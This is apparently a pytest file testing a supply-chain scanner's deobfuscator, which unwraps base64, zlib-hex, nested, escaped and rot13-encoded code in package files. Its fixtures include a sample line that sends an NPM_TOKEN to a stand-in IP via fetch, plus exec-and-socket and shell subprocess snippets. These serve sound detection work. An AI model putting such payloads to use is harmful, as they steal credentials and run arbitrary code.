import base64
import binascii
import zlib

from secopsai import deobfuscate as d

PAYLOAD = b"const cp = require('child_process'); fetch('https://203.0.113.9/x?d=' + process.env.NPM_TOKEN)"


def _decoded(members):
    return {name: content for name, content in d.expand(members) if ".decoded-" in name}


def test_base64_handed_to_eval_is_exposed():
    source = b"eval(Buffer.from('" + base64.b64encode(PAYLOAD) + b"', 'base64').toString())"
    decoded = _decoded([("package/index.js", source)])
    assert list(decoded.values()) == [PAYLOAD]


def test_compressed_hex_python_payload_is_exposed():
    blob = binascii.hexlify(zlib.compress(b"import os, socket\nexec(os.environ['X'])\ns = socket.socket()"))
    source = b"import zlib, binascii\nexec(zlib.decompress(binascii.unhexlify('" + blob + b"')))"
    assert any(b"socket.socket()" in value for value in _decoded([("pkg/setup.py", source)]).values())


def test_nested_layers_are_unwrapped_two_deep():
    inner = base64.b64encode(PAYLOAD)
    outer = base64.b64encode(b"var s = '" + inner + b"'; eval(atob(s))")
    decoded = _decoded([("a.js", b"eval(atob('" + outer + b"'))")])
    assert any(PAYLOAD == value for value in decoded.values())


def test_escaped_hex_char_codes_and_rot13_are_exposed():
    escaped = "".join(f"\\x{byte:02x}" for byte in PAYLOAD).encode()
    codes = ",".join(str(byte) for byte in PAYLOAD).encode()
    rot = __import__("codecs").encode("import subprocess; subprocess.run(curl_args, shell=True) # http://x", "rot13").encode()
    decoded = _decoded([("a.js", b"var p='" + escaped + b"';"), ("b.js", b"String.fromCharCode(" + codes + b")"),
                        ("c.py", b"exec(codecs.decode('" + rot + b"', 'rot13'))")])
    values = list(decoded.values())
    assert PAYLOAD in values and any(b"subprocess.run" in value for value in values)


def test_images_data_and_clean_code_add_nothing():
    png = base64.b64encode(b"\x89PNG\r\n\x1a\n" + bytes(range(256)) * 4)
    words = base64.b64encode(b"lorem ipsum dolor sit amet consectetur adipiscing elit sed do eiusmod tempor")
    members = [("a.js", b"const icon = 'data:image/png;base64," + png + b"';"), ("b.js", b"const t = '" + words + b"';"),
               ("c.js", b"module.exports = function add(a, b) { return a + b }"), ("d.png", png)]
    assert _decoded(members) == {}


def test_only_code_files_are_read_and_budgets_hold(monkeypatch):
    many = b"\n".join(b"x" + str(i).encode() + b"='" + base64.b64encode(PAYLOAD + str(i).encode()) + b"'" for i in range(100))
    assert len(_decoded([("big.js", many)])) == d.MAX_PAYLOADS
    assert _decoded([("README.md", b"'" + base64.b64encode(PAYLOAD) + b"'")]) == {}
    monkeypatch.setenv("SECOPSAI_DEOBFUSCATE", "0")
    assert _decoded([("a.js", b"eval(atob('" + base64.b64encode(PAYLOAD) + b"'))")]) == {}


def test_decoded_payloads_reach_the_rules():
    from secopsai import package_features

    source = b"eval(Buffer.from('" + base64.b64encode(PAYLOAD) + b"', 'base64').toString())"
    plain = set(package_features.profile([("package/index.js", source)]))
    expanded = set(package_features.profile(d.expand([("package/index.js", source)])))
    assert expanded - plain, "the decoded payload adds behaviour flags the rules could not see"
